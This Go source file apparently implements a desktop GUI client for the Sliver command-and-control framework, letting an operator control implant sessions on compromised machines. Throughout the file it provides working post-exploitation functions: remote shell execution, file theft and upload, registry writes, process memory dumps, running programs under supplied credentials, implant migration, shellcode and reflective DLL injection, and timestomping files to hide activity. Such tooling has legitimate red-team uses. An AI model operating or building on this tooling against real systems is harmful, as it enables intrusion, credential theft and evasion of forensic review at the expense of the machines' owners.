package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/wailsapp/wails/v2/pkg/runtime"
	"google.golang.org/protobuf/proto"

	"sliver-gui/internal/sliverclient"
)

type App struct {
	ctx         context.Context
	mu          sync.Mutex
	client      *sliverclient.Client
	eventCancel context.CancelFunc

	// Advanced tunneling state (SOCKS5 + port forwarding).
	// Guarded by advMu, NOT mu, so we never deadlock with requireClient().
	advMu    sync.Mutex
	socks    map[string]*socksProxyHandle // sessionID -> active socks proxy
	portfwds map[string][]*portfwdHandle  // sessionID -> active port forwards
}

func NewApp() *App {
	return &App{
		socks:    map[string]*socksProxyHandle{},
		portfwds: map[string][]*portfwdHandle{},
	}
}

func (a *App) startup(ctx context.Context)  { a.ctx = ctx }
func (a *App) shutdown(ctx context.Context) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.eventCancel != nil {
		a.eventCancel()
	}
	if a.client != nil {
		a.client.Close()
	}
}

// ─── Connection ───────────────────────────────────────────────────────────────

func (a *App) PickConfigFile() (string, error) {
	return runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{
		Title:   "Select Sliver operator config (.cfg)",
		Filters: []runtime.FileFilter{{DisplayName: "Sliver Config (*.cfg)", Pattern: "*.cfg"}},
	})
}

type ConnectResult struct {
	Connected    bool   `json:"connected"`
	OperatorName string `json:"operatorName"`
	Teamserver   string `json:"teamserver"`
	Error        string `json:"error,omitempty"`
}

func (a *App) Connect(configPath string) ConnectResult {
	cfg, err := sliverclient.LoadConfig(configPath)
	if err != nil {
		return ConnectResult{Error: err.Error()}
	}
	client, err := sliverclient.Connect(*cfg)
	if err != nil {
		return ConnectResult{Error: err.Error()}
	}
	a.mu.Lock()
	if a.client != nil {
		a.client.Close()
	}
	if a.eventCancel != nil {
		a.eventCancel()
	}
	a.client = client
	a.mu.Unlock()

	a.startEventStream()

	return ConnectResult{
		Connected:    true,
		OperatorName: cfg.Operator,
		Teamserver:   fmt.Sprintf("%s:%d", cfg.LHost, cfg.LPort),
	}
}

func (a *App) Disconnect() {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.eventCancel != nil {
		a.eventCancel()
		a.eventCancel = nil
	}
	if a.client != nil {
		a.client.Close()
		a.client = nil
	}
}

func (a *App) requireClient() (*sliverclient.Client, error) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.client == nil {
		return nil, fmt.Errorf("not connected to a teamserver")
	}
	return a.client, nil
}

// ─── Event Stream ─────────────────────────────────────────────────────────────

func (a *App) startEventStream() {
	a.mu.Lock()
	streamCtx, cancel := context.WithCancel(a.ctx)
	a.eventCancel = cancel
	client := a.client
	a.mu.Unlock()

	go func() {
		stream, err := client.RPC.Events(streamCtx, &commonpb.Empty{})
		if err != nil {
			runtime.EventsEmit(a.ctx, "sliver:disconnected", err.Error())
			return
		}
		for {
			event, err := stream.Recv()
			if err != nil {
				// The teamserver stream died — signal the frontend so it can
				// show the reconnect overlay. Suppress if this was a clean
				//, operator-initiated Disconnect() (context cancelled).
				if streamCtx.Err() == nil {
					runtime.EventsEmit(a.ctx, "sliver:disconnected", err.Error())
				}
				return
			}
			payload := map[string]interface{}{
				"type": event.EventType,
				"data": string(event.Data),
			}
			if event.Session != nil {
				payload["session"] = map[string]interface{}{
					"id":       event.Session.ID,
					"hostname": event.Session.Hostname,
					"username": event.Session.Username,
					"os":       event.Session.OS,
					"arch":     event.Session.Arch,
				}
			}
			// NOTE: clientpb.Event has no Beacon field in v1.7.3 — beacon
			// events carry their payload in event.Data (already emitted above).
			if event.Job != nil {
				payload["job"] = map[string]interface{}{
					"id":   event.Job.ID,
					"name": event.Job.Name,
				}
			}
			runtime.EventsEmit(a.ctx, "sliver:event", payload)
		}
	}()
}

// ─── Version ─────────────────────────────────────────────────────────────────

type VersionInfo struct {
	Major    int32  `json:"major"`
	Minor    int32  `json:"minor"`
	Patch    int32  `json:"patch"`
	Commit   string `json:"commit"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Compiled string `json:"compiled"`
}

func (a *App) GetVersion() (VersionInfo, error) {
	client, err := a.requireClient()
	if err != nil {
		return VersionInfo{}, err
	}
	resp, err := client.RPC.GetVersion(a.ctx, &commonpb.Empty{})
	if err != nil {
		return VersionInfo{}, err
	}
	return VersionInfo{
		Major:    resp.Major,
		Minor:    resp.Minor,
		Patch:    resp.Patch,
		Commit:   resp.Commit,
		OS:       resp.OS,
		Arch:     resp.Arch,
		Compiled: time.Unix(resp.CompiledAt, 0).UTC().Format("2006-01-02"),
	}, nil
}

// ─── Sessions ────────────────────────────────────────────────────────────────

type SessionView struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	Transport   string `json:"transport"`
	RemoteAddr  string `json:"remoteAddress"`
	LastCheckin string `json:"lastCheckin"`
	PID         int32  `json:"pid"`
	IsDead      bool   `json:"isDead"`
}

func (a *App) ListSessions() ([]SessionView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	sessions, err := client.ListSessions(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]SessionView, 0, len(sessions))
	for _, s := range sessions {
		out = append(out, sessionToView(s))
	}
	return out, nil
}

func sessionToView(s *clientpb.Session) SessionView {
	return SessionView{
		ID:          s.ID,
		Name:        s.Name,
		Hostname:    s.Hostname,
		Username:    s.Username,
		OS:          s.OS,
		Arch:        s.Arch,
		Transport:   s.Transport,
		RemoteAddr:  s.RemoteAddress,
		LastCheckin: time.Unix(s.LastCheckin, 0).Format("15:04:05"),
		PID:         s.PID,
		IsDead:      s.IsDead,
	}
}

func (a *App) RenameSession(sessionID, newName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	return client.RenameSession(a.ctx, sessionID, newName)
}

func (a *App) KillSession(sessionID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Kill(a.ctx, &sliverpb.KillReq{
		Force:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Execute ─────────────────────────────────────────────────────────────────

type ExecResult struct {
	Stdout string `json:"stdout"`
	Stderr string `json:"stderr"`
	Status uint32 `json:"status"`
	Error  string `json:"error,omitempty"`
}

func (a *App) ExecuteCommand(sessionID, command string) ExecResult {
	client, err := a.requireClient()
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	sessions, _ := client.ListSessions(a.ctx)
	var sessionOS string
	for _, s := range sessions {
		if s.ID == sessionID {
			sessionOS = strings.ToLower(s.OS)
			break
		}
	}
	var exePath string
	var args []string
	if strings.Contains(sessionOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	return ExecResult{
		Stdout: string(resp.Stdout),
		Stderr: string(resp.Stderr),
		Status: resp.Status,
	}
}

// RunExecute runs a program on the target directly (Sliver's `execute`), without
// wrapping it in a shell. Use this for `execute <path> [args...]`.
func (a *App) RunExecute(sessionID, path string, args []string) ExecResult {
	client, err := a.requireClient()
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    path,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	return ExecResult{Stdout: string(resp.Stdout), Stderr: string(resp.Stderr), Status: resp.Status}
}

// ─── Screenshot ──────────────────────────────────────────────────────────────

func (a *App) TakeScreenshot(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Screenshot(a.ctx, &sliverpb.ScreenshotReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return "data:image/png;base64," + base64.StdEncoding.EncodeToString(resp.Data), nil
}

// ─── Process List ────────────────────────────────────────────────────────────

type ProcessView struct {
	PID        int32  `json:"pid"`
	PPID       int32  `json:"ppid"`
	Executable string `json:"executable"`
	Owner      string `json:"owner"`
	Arch       string `json:"arch"`
	CmdLine    string `json:"cmdLine"`
}

func (a *App) GetProcessList(sessionID string) ([]ProcessView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Ps(a.ctx, &sliverpb.PsReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]ProcessView, 0, len(resp.Processes))
	for _, p := range resp.Processes {
		out = append(out, ProcessView{
			PID:        p.Pid,
			PPID:       p.Ppid,
			Executable: p.Executable,
			Owner:      p.Owner,
			Arch:       p.Architecture,
			CmdLine:    strings.Join(p.CmdLine, " "),
		})
	}
	return out, nil
}

func (a *App) KillRemoteProcess(sessionID string, pid uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Terminate(a.ctx, &sliverpb.TerminateReq{
		Pid:     int32(pid),
		Force:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Netstat ─────────────────────────────────────────────────────────────────

type NetstatEntry struct {
	LocalAddr  string `json:"localAddr"`
	RemoteAddr string `json:"remoteAddr"`
	Protocol   string `json:"protocol"`
	State      string `json:"state"`
	PID        uint32 `json:"pid"`
	Process    string `json:"process"`
}

func (a *App) GetNetstat(sessionID string) ([]NetstatEntry, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Netstat(a.ctx, &sliverpb.NetstatReq{
		TCP:       true,
		UDP:       true,
		IP4:       true,
		IP6:       true,
		Listening: true,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]NetstatEntry, 0, len(resp.Entries))
	for _, e := range resp.Entries {
		local, remote := "", ""
		if e.LocalAddr != nil {
			local = fmt.Sprintf("%s:%d", e.LocalAddr.Ip, e.LocalAddr.Port)
		}
		if e.RemoteAddr != nil {
			remote = fmt.Sprintf("%s:%d", e.RemoteAddr.Ip, e.RemoteAddr.Port)
		}
		var pid uint32
		var proc string
		if e.Process != nil {
			pid = uint32(e.Process.Pid)
			proc = e.Process.Executable
		}
		out = append(out, NetstatEntry{
			LocalAddr:  local,
			RemoteAddr: remote,
			Protocol:   e.Protocol,
			State:      e.SkState,
			PID:        pid,
			Process:    proc,
		})
	}
	return out, nil
}

// ─── Env Vars ────────────────────────────────────────────────────────────────

type EnvVar struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func (a *App) GetEnvVars(sessionID string) ([]EnvVar, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetEnv(a.ctx, &sliverpb.EnvReq{
		Name:    "",
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]EnvVar, 0, len(resp.Variables))
	for _, v := range resp.Variables {
		out = append(out, EnvVar{Key: v.Key, Value: v.Value})
	}
	return out, nil
}

func (a *App) SetEnvVar(sessionID, key, value string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.SetEnv(a.ctx, &sliverpb.SetEnvReq{
		Variable: &commonpb.EnvVar{Key: key, Value: value},
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) UnsetEnvVar(sessionID, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.UnsetEnv(a.ctx, &sliverpb.UnsetEnvReq{
		Name:    key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Registry (Windows) ──────────────────────────────────────────────────────

type RegistryKey struct {
	Name string `json:"name"`
}

type RegistryValue struct {
	Name  string `json:"name"`
	Type  string `json:"type"`
	Value string `json:"value"`
}

func (a *App) RegistryListSubKeys(sessionID, hive, path string) ([]string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.RegistryListSubKeys(a.ctx, &sliverpb.RegistrySubKeyListReq{
		Hive:    hive,
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	return resp.Subkeys, nil
}

// hiveToRegQuery maps the short hive names used in the UI to the full names
// that reg.exe expects.
var hiveToRegQuery = map[string]string{
	"HKLM": "HKEY_LOCAL_MACHINE",
	"HKCU": "HKEY_CURRENT_USER",
	"HKCR": "HKEY_CLASSES_ROOT",
	"HKU":  "HKEY_USERS",
	"HKCC": "HKEY_CURRENT_CONFIG",
}

// RegistryListValues: the RegistryListValues RPC only returns value *names*
// (RegistryValuesList.ValueNames) in v1.7.3 — no types or data. To show
// name/type/value we fall back to `reg query` via Execute and parse its output.
func (a *App) RegistryListValues(sessionID, hive, path string) ([]RegistryValue, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	fullHive := hiveToRegQuery[strings.ToUpper(hive)]
	if fullHive == "" {
		fullHive = hive
	}
	keyPath := fullHive
	if path != "" {
		keyPath = fullHive + "\\" + strings.Trim(path, "\\")
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    "reg.exe",
		Args:    []string{"query", keyPath},
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := []RegistryValue{}
	lines := strings.Split(strings.ReplaceAll(string(resp.Stdout), "\r\n", "\n"), "\n")
	for _, line := range lines {
		// Value rows are indented; reg.exe separates columns with 4 spaces.
		if !strings.HasPrefix(line, "    ") {
			continue
		}
		cols := strings.SplitN(strings.TrimLeft(line, " "), "    ", 3)
		if len(cols) < 3 {
			continue
		}
		out = append(out, RegistryValue{
			Name:  strings.TrimSpace(cols[0]),
			Type:  strings.TrimSpace(cols[1]),
			Value: strings.TrimSpace(cols[2]),
		})
	}
	return out, nil
}

func (a *App) RegistryReadValue(sessionID, hive, path, key string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.RegistryRead(a.ctx, &sliverpb.RegistryReadReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Value, nil
}

func (a *App) RegistryWriteValue(sessionID, hive, path, key, value string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryWrite(a.ctx, &sliverpb.RegistryWriteReq{
		Hive:        hive,
		Path:        path,
		Key:         key,
		StringValue: value,
		Type:        1, // RegistryWriteReq.Type is uint32; 1 == REG_SZ
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RegistryCreateKey(sessionID, hive, path, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryCreateKey(a.ctx, &sliverpb.RegistryCreateKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RegistryDeleteKey(sessionID, hive, path, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryDeleteKey(a.ctx, &sliverpb.RegistryDeleteKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── File Browser ────────────────────────────────────────────────────────────

type LsResult struct {
	Path  string     `json:"path"`
	Files []FileInfo `json:"files"`
	Error string     `json:"error,omitempty"`
}

type FileInfo struct {
	Name  string `json:"name"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
	Mode  string `json:"mode"`
}

func (a *App) ListFiles(sessionID, path string) LsResult {
	client, err := a.requireClient()
	if err != nil {
		return LsResult{Error: err.Error()}
	}
	if path == "" {
		path = "."
	}
	resp, err := client.RPC.Ls(a.ctx, &sliverpb.LsReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return LsResult{Error: err.Error()}
	}
	files := make([]FileInfo, 0, len(resp.Files))
	for _, f := range resp.Files {
		files = append(files, FileInfo{Name: f.Name, IsDir: f.IsDir, Size: f.Size, Mode: f.Mode})
	}
	return LsResult{Path: resp.Path, Files: files}
}

func (a *App) MakeDirectory(sessionID, path string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Mkdir(a.ctx, &sliverpb.MkdirReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ChangeDir changes the implant's working directory (real Cd RPC) and returns
// the new absolute path.
func (a *App) ChangeDir(sessionID, path string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Cd(a.ctx, &sliverpb.CdReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

// PrintWorkingDir returns the implant's current working directory (real Pwd RPC).
func (a *App) PrintWorkingDir(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Pwd(a.ctx, &sliverpb.PwdReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

func (a *App) MoveFile(sessionID, src, dst string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Mv(a.ctx, &sliverpb.MvReq{
		Src:     src,
		Dst:     dst,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) CopyFile(sessionID, src, dst string) (int64, error) {
	client, err := a.requireClient()
	if err != nil {
		return 0, err
	}
	resp, err := client.RPC.Cp(a.ctx, &sliverpb.CpReq{
		Src:     src,
		Dst:     dst,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return 0, err
	}
	return resp.BytesWritten, nil
}

// ReadRemoteFile downloads a file and returns its contents as text (for `cat`).
func (a *App) ReadRemoteFile(sessionID, path string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             path,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	if resp.IsDir {
		return "", fmt.Errorf("%s is a directory", path)
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// ─── Network / Privileges / Memory ─────────────────────────────────────────────

type NetInterfaceView struct {
	Name string   `json:"name"`
	MAC  string   `json:"mac"`
	IPs  []string `json:"ips"`
}

func (a *App) Ifconfig(sessionID string) ([]NetInterfaceView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Ifconfig(a.ctx, &sliverpb.IfconfigReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]NetInterfaceView, 0, len(resp.NetInterfaces))
	for _, ni := range resp.NetInterfaces {
		out = append(out, NetInterfaceView{Name: ni.Name, MAC: ni.MAC, IPs: ni.IPAddresses})
	}
	return out, nil
}

type PrivEntry struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
}

type PrivsResult struct {
	Integrity   string      `json:"integrity"`
	ProcessName string      `json:"processName"`
	Privs       []PrivEntry `json:"privs"`
}

func (a *App) GetPrivs(sessionID string) (PrivsResult, error) {
	client, err := a.requireClient()
	if err != nil {
		return PrivsResult{}, err
	}
	resp, err := client.RPC.GetPrivs(a.ctx, &sliverpb.GetPrivsReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return PrivsResult{}, err
	}
	out := PrivsResult{Integrity: resp.ProcessIntegrity, ProcessName: resp.ProcessName}
	for _, p := range resp.PrivInfo {
		out.Privs = append(out.Privs, PrivEntry{Name: p.Name, Description: p.Description, Enabled: p.Enabled})
	}
	return out, nil
}

// ProcessDump dumps a process's memory and saves it via a native dialog.
func (a *App) ProcessDump(sessionID string, pid int32) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.ProcessDump(a.ctx, &sliverpb.ProcessDumpReq{
		Pid:     pid,
		Timeout: 30,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: fmt.Sprintf("procdump_%d.dmp", pid),
		Title:           "Save process dump",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.Data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.Data))}
}

func (a *App) RemoveFile(sessionID, path string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Rm(a.ctx, &sliverpb.RmReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── File Transfers ──────────────────────────────────────────────────────────

type TransferResult struct {
	Path  string `json:"path"`
	Bytes int64  `json:"bytes"`
	Error string `json:"error,omitempty"`
}

func (a *App) DownloadFile(sessionID, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return TransferResult{Error: "decode: " + err.Error()}
	}
	savePath, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: filepath.Base(remotePath),
		Title:           "Save downloaded file",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(data))}
}

// decodeDownload returns the file bytes from a Download response, transparently
// gunzipping when the implant gzip-encoded the payload (resp.Encoder == "gzip").
func decodeDownload(resp *sliverpb.Download) ([]byte, error) {
	if resp.Encoder == "gzip" {
		gz, err := gzip.NewReader(bytes.NewReader(resp.Data))
		if err != nil {
			return nil, err
		}
		defer gz.Close()
		return io.ReadAll(gz)
	}
	return resp.Data, nil
}

func (a *App) UploadFile(sessionID, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	localPath, err := runtime.OpenFileDialog(a.ctx, runtime.OpenDialogOptions{
		Title: "Select file to upload",
	})
	if err != nil || localPath == "" {
		return TransferResult{Error: "upload cancelled"}
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	target := remotePath
	if target == "" {
		target = filepath.Base(localPath)
	}
	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    target,
		Data:    data,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: target, Bytes: int64(len(data))}
}

// UploadFileFrom uploads a specific local file (on the operator machine) to a
// remote path — CLI-style `upload <local> <remote>`, no file dialog.
func (a *App) UploadFileFrom(sessionID, localPath, remotePath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return TransferResult{Error: "read local file: " + err.Error()}
	}
	target := remotePath
	if target == "" {
		target = filepath.Base(localPath)
	}
	_, err = client.RPC.Upload(a.ctx, &sliverpb.UploadReq{
		Path:    target,
		Data:    data,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: target, Bytes: int64(len(data))}
}

// DownloadFileTo downloads a remote file straight to a local path — CLI-style
// `download <remote> <local>`, no save dialog.
func (a *App) DownloadFileTo(sessionID, remotePath, localPath string) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             remotePath,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return TransferResult{Error: "decode: " + err.Error()}
	}
	if err := os.WriteFile(localPath, data, 0644); err != nil {
		return TransferResult{Error: "write local file: " + err.Error()}
	}
	return TransferResult{Path: localPath, Bytes: int64(len(data))}
}

// ─── Advanced execution / privilege (session) ───────────────────────────────────

// RunAs runs a program as another user (Windows).
func (a *App) RunAs(sessionID, username, domain, password, program, args string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.RunAs(a.ctx, &sliverpb.RunAsReq{
		Username:    username,
		Domain:      domain,
		Password:    password,
		ProcessName: program,
		Args:        args,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Output, nil
}

// Migrate injects the implant into another process (pid), building the payload
// from a saved implant profile's config.
func (a *App) Migrate(sessionID string, pid uint32, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	cfg, err := a.profileConfig(profileName)
	if err != nil {
		return err
	}
	_, err = client.RPC.Migrate(a.ctx, &clientpb.MigrateReq{
		Pid:     pid,
		Config:  cfg,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// profileConfig fetches a saved implant profile's config by name.
func (a *App) profileConfig(name string) (*clientpb.ImplantConfig, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	profiles, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	for _, p := range profiles.Profiles {
		if p.Name == name {
			if p.Config == nil {
				return nil, fmt.Errorf("profile %q has no config", name)
			}
			// getsystem/migrate inject SHELLCODE into a process, so rebuild a
			// fresh, complete config from the profile's core params with the
			// format forced to shellcode. This avoids stale/partial fields from
			// the DB round-trip that can produce invalid generated source.
			req := GenerateRequest{
				GOOS:   p.Config.GOOS,
				GOARCH: p.Config.GOARCH,
				Format: "shellcode",
				Debug:  p.Config.Debug,
			}
			if len(p.Config.C2) > 0 {
				req.C2URL = p.Config.C2[0].URL
			}
			if req.C2URL == "" {
				return nil, fmt.Errorf("profile %q has no C2 URL", name)
			}
			return a.buildImplantConfig(req), nil
		}
	}
	return nil, fmt.Errorf("implant profile %q not found — create one in the Profiles panel first", name)
}

// ExecuteShellcode injects shellcode (opened via a native dialog) into a process.
// pid 0 = the implant's own process.
func (a *App) ExecuteShellcode(sessionID, localPath string, pid uint32) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select shellcode (.bin)")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	_, err = client.RPC.Task(a.ctx, &sliverpb.TaskReq{
		Data:     data,
		Pid:      pid,
		RWXPages: true,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: "[+] shellcode injected"}
}

// SpawnDll reflectively loads a DLL (opened via a native dialog) into a process.
func (a *App) SpawnDll(sessionID, localPath, args, entryPoint string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select reflective DLL")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	ep := entryPoint
	if ep == "" {
		ep = "ReflectiveLoader"
	}
	_, err = client.RPC.SpawnDll(a.ctx, &sliverpb.InvokeSpawnDllReq{
		Data:        data,
		ProcessName: "notepad.exe",
		Args:        strings.Fields(args),
		EntryPoint:  ep,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: "[+] DLL spawned"}
}

func (a *App) Chmod(sessionID, path, mode string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chmod(a.ctx, &sliverpb.ChmodReq{
		Path:     path,
		FileMode: mode,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) Chown(sessionID, path, uid, gid string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chown(a.ctx, &sliverpb.ChownReq{
		Path:    path,
		Uid:     uid,
		Gid:     gid,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// Chtimes timestomps a file — sets access + modified time (unix seconds).
func (a *App) Chtimes(sessionID, path string, atime, mtime int64) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Chtimes(a.ctx, &sliverpb.ChtimesReq{
		Path:    path,
		ATime:   atime,
		MTime:   mtime,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

